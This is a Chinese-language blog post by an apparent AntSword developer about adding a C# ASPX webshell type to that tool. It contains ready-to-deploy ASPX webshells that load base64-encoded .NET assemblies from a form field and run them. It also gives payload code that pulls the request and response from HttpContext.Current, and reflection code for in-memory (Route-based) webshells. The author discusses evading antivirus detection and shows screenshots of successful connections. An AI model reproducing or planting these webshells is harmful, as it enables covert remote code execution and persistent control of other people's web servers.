# 聊聊新类型ASPXCSharp


<meta name="referrer" content="no-referrer" />



## 前言

最近花了点时间，给蚁剑加上了C#的shell类型。

其实蚁剑在实现jscript加载assembly之后，jscript已经可以实现所有C#可以实现的功能：http://yzddmr6.com/posts/jscript-load-csharp-assembly/



这次增加主要是有几点考虑： 

1. Jscript的shell出现很容易被杀。我还没有见过用jscript写的项目，web目录下面出现了Jscript文件99.99%就是webshell，特征更明显一些。

2. Jscript的语法属实恶心。没有啥文档，坑全部靠踩。

3. C#类型可以兼容asp.net 各种内存马，Jscript无法做到。



本文记录一下自己在开发设计的过程中，遇到的一些问题以及自己的思考。

## 自定义类名

其实一开始遇到的问题是无法自定义类名的问题。c#跟java有一点不同的是，java的newInstance是不需要指定type的，只要有Class对象就可以实例化。但是c#在实例化的时候必须要指定实例化的type，这也意味着我们所有的全限定类名必须要一样。

冰蝎默认类名都是U，就建在根命名空间下。每个payload是单独编译的。

哥斯拉同样采用了这种机制，实例化的类名是LY。但是因为哥斯拉采用的方式是一次性把payload都打到内存里然后反射调用，所以可以把所有的基础payload都编译到一个dll里面。

但是这样开发Payload的时候会很难受，因为在同一个项目下面都用一个固定的类名，编译器是会报冲突的。

后来想到了一种取巧的办法，用python命令行调用编译程序，在编译之前把类名都统一替换掉。暂时解决了问题，但是还是感觉不够优雅。

那么有没有什么办法可以动态获取到assembly的type呢？

翻了翻手册，发现以下方法

| [GetType()](https://docs.microsoft.com/zh-cn/dotnet/api/system.object.gettype?view=netframework-3.0#System_Object_GetType) | 获取当前实例的 [Type](https://docs.microsoft.com/zh-cn/dotnet/api/system.type?view=netframework-3.0)。(继承自 [Object](https://docs.microsoft.com/zh-cn/dotnet/api/system.object?view=netframework-3.0)) |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| [GetTypes()](https://docs.microsoft.com/zh-cn/dotnet/api/system.reflection.assembly.gettypes?view=netframework-3.0#System_Reflection_Assembly_GetTypes) | 获取此程序集中定义的类型。                                   |
| [GetName()](https://docs.microsoft.com/zh-cn/dotnet/api/system.reflection.assembly.getname?view=netframework-3.0#System_Reflection_Assembly_GetName) | 获取此程序集的 [AssemblyName](https://docs.microsoft.com/zh-cn/dotnet/api/system.reflection.assemblyname?view=netframework-3.0)。 |

写代码测试一下

```cpp
String Payload = "xxx";
System.Reflection.Assembly a = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
Console.WriteLine("Assembly.GetName: "+a.GetName());
Console.WriteLine("Assembly.GetName.Name: "+a.GetName().Name);
Console.WriteLine("Assembly.GetType: "+a.GetType());
Console.WriteLine("Assembly.GetTypes[0]: "+a.GetTypes()[0]);
Console.WriteLine("Assembly.GetTypes[0].FullName: "+a.GetTypes()[0].FullName);
```

output

```cpp
Assembly.GetName: BASE_Info, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
Assembly.GetName.Name: BASE_Info
Assembly.GetType: System.Reflection.Assembly
Assembly.GetTypes[0]: BASE_Info.Run
Assembly.GetTypes[0].FullName: BASE_Info.Run
```

Assembly.GetTypes返回的是一个列表，而payload里面我们通常只会定义一个类，所以可以通过Assembly.GetTypes[0]来获取payload类的type。

webshell中可以采用如下写法。

```cpp
<%@ Page Language="c#"%>
<%
    String Payload = Request.Form["ant"];
    if (Payload != null)
    {
        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
        assembly.CreateInstance(assembly.GetTypes()[0].FullName).Equals(Context);
    }
%>
```

这里又跟java的defineClass不太一样，defineClass只能打进去一个类，而c#的Assembly.Load可以加载一个程序集，并不一定只是一个类。所以为了考虑今后payload里可能会有多个类的情况，推荐的写法如下：

```cpp
<%@ Page Language="c#"%>
<%
    String Payload = Request.Form["ant"];
    if (Payload != null)
    {
        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
        assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(Context);
    }
%>
```

即强行指定实例化的类为命名空间下名为Run的类。

## 兼容内存马

rebeyond大佬在最开始用加载assembly作为aspx类型的shell时，默认Equals里面是this对象。也就是Page对象。这种方式在aspx文件落地的情况下没有毛病，但是在内存马环境下，是没有Page对象的，这种办法也就不兼容。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1640785002220-ae3b85ba-9b25-49ec-a7f8-309373607cd2.png)

微软文档如下图



![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1640785105596-fd3b9c07-8cba-432f-867d-f9415f1be072.png)



哥斯拉则对此进行了兼容处理，不再采用Page对象，而采用了兼容性更好的HttpContext



![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1640784688148-28effe7d-2674-4e6a-bc7d-cd2d36a1ec2b.png)



其实入口参数的本质就是获取到当前的request跟response对象。

吸取了jsp的经验，一开始parseObj函数内置了三种方法：

```cpp
public void parseObj(Object obj)
        {
            if (obj.GetType().IsArray)//直接数组传入
            {
                Object[] data = (Object[])obj;
                this.Request = (HttpRequest)data[0];
                this.Response = (HttpResponse)data[1];
            }
            else
            {
                try
                {
                    Page page = (Page)obj;//传入Page对象
                    this.Response = page.Response;
                    this.Request = page.Request;
                }
                catch (Exception)
                {
                    HttpContext context = (HttpContext)obj;//传入HttpContext对象
                    this.Response = context.Response;
                    this.Request = context.Request;
                }
            }
        }
```

所以在shell中用以下写法均可连接

```cpp
//利用Page对象
System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)).CreateInstance(xxx).Equals(this);

//利用Context对象
System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)).CreateInstance(xxx).Equals(Context);

//利用数组
System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)).CreateInstance(xxx).Equals(new object[] { Request, Response });
```



以asp.net的Route内存马为例，从route上下文中获取到的Context是HttpContextBase，而不是HttpContext。具体的实现类为System.Web.HttpContextWrapper。

![img](https://cdn.nlark.com/yuque/0/2022/png/1599908/1641130345472-31fd4893-67df-42cb-b85a-d99abb0aea03.png)

并且通过HttpContextWrapper.Request获取到的对象是HttpRequestBase，默认实现类是System.Web.HttpRequestWrapper。有点类似Tomcat的门面模式。

![img](https://cdn.nlark.com/yuque/0/2022/png/1599908/1641130306995-dfcb9107-7b47-4574-9980-c2993295b799.png)

如果要采用数组的方式可以用以下反射代码实现

```cpp
                FieldInfo requestField =
                    typeof(HttpRequestWrapper).GetField("_httpRequest", BindingFlags.Instance | BindingFlags.NonPublic);
                HttpRequest httpRequest =
                    (HttpRequest)requestField.GetValue(httpContext.Request);

                FieldInfo responseField =
                    typeof(HttpResponseWrapper).GetField("_httpResponse",
                        BindingFlags.Instance | BindingFlags.NonPublic);
                HttpResponse httpResponse =
                    (HttpResponse)responseField.GetValue(httpContext.Response);
                System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
                assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(new object[] { httpRequest, httpResponse });
```

访问注入内存马的aspx，一片空白说明注入成功

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1640526055957-542be082-0d6f-449b-a1bd-fe1a241da5f1.png)

蚁剑中输入任意url，连接成功。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1640524070570-fdec514f-a08a-439d-bcf3-53012a96551a.png)

## 进一步思考

看起来不错了，但是还有继续优化的空间吗？

Java中一个比较著名的问题是内存马回显，实际上是如何从当前线程获取当前的request跟response对象。这个问题其实比较蛋疼，因为不同的容器有不同的实现细节，无法统一处理。

但是C#则直接把这个接口给暴露了出来，直接可以通过HttpContext.Current获取到当前的context，从而获取当前的request跟response对象。



再次改造之后，payload中parseObj如下：

```cpp
public void parseObj(Object obj)
        {
            if (obj.GetType().IsArray)
            {
                Object[] data = (Object[])obj;
                this.Request = (HttpRequest)data[0];
                this.Response = (HttpResponse)data[1];
            }
            else
            {
                try
                {
                    HttpContext context = (HttpContext)obj;
                    this.Response = context.Response;
                    this.Request = context.Request;
                }
                catch (Exception)
                {
                    HttpContext context = HttpContext.Current;
                    this.Response = context.Response;
                    this.Request = context.Request;
                }
            }
        }
```

改版后我们去掉了兼容性不强的Page方式，如果数组方式跟Context都无法获取的话，就尝试通过HttpContext.Current来拿到当前的Context。

所以其实在shell中直接Equals(null)，或者一个随意对象即可。

```cpp
<%@ Page Language="c#"%>
<%
    String Payload = Request.Form["ant"];
    if (Payload != null)
    {
        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
        assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(null);
    }
%>
```

同样可以连接成功

![img](https://cdn.nlark.com/yuque/0/2022/png/1599908/1641130099163-935e8777-5494-41e2-b096-4f49a802e7bb.png)

至于为什么没有把原来的入口参数方式全部都去掉，是因为新类型并没有在实战环境中测试过。不知道会不会有一些特殊情况。为了谨慎起见，还是保留了原来的入口参数。



## 最后

个人喜欢开发一些工具，同时记录下自己的碎碎念。如果能对你有帮助，那就最好不过了。

github地址：https://github.com/AntSwordProject/antSword/commit/d2d848c89e03088c20cc31f411e73fe2dd2973ea
